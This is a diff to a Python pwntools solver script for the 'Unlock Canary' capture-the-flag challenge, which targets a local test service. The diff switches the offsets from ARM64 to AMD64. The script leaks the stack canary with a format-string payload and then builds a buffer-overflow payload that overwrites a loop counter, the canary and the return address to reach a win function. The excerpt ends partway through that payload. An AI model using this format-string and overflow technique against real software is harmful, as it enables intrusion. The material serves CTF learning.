@@ -1,22 +1,25 @@
 #!/usr/bin/env python3
-# This is the solver script for the Unlock Canary challenge. 
-# The script is for ARM64 architecture. 
+# * This is the solver script for the Unlock Canary challenge. 
+# * Change the parameter number when leaking canary and stack alignment
+#   based on the architecture 
 from pwn import *
 
-host = "127.0.0.1" 
-port = "61215"
+host = "127.0.0.1"              # change to the actual server hostname
+port = "51518"                  # change to the updated port
 
 conn = remote(host, port)
 
 BUFFER_LEN = 8
-PADDING_LEN = 6
-WIN_ADDR = 0x400b38
+PADDING_LEN = 0                 # 6 bytes padding for ARM64 tho
+WIN_ADDR = 0x401423             # address to win function by objdump
 
 print(conn.recvuntil("\nEnter your message:\n"))
 
 # Step 1 Leak canary
-payload = b"%12$llu"            # local canary stored at the 12th argument on arm64
-                                # prob for other architecture
+payload = b"%8$llu"             # local canary stored at the 8th argument on AMD64
+                                # 4 registers than stack
+# payload = b"%12$llu"          # local canary stored at the 12th argument on ARM64
+#                               # 8 registers than stack
 
 conn.sendline(payload)
 
@@ -24,8 +27,9 @@ canary = conn.recvuntil("\n")
 canary = int(canary.rstrip(b'\r\n'))
 print("Canary: " + str(canary))
 
-# Step 2 Overwrite i and run to finish while loop;
-#        Overwrite canary and return address with address to win
+# Step 2 
+# * Overwrite i and run to finish while loop;
+# * Overwrite canary and return address with address to win
 payload = b"A" * BUFFER_LEN
 payload += b"U" * PADDING_LEN
 payload += b"Z"                 # i
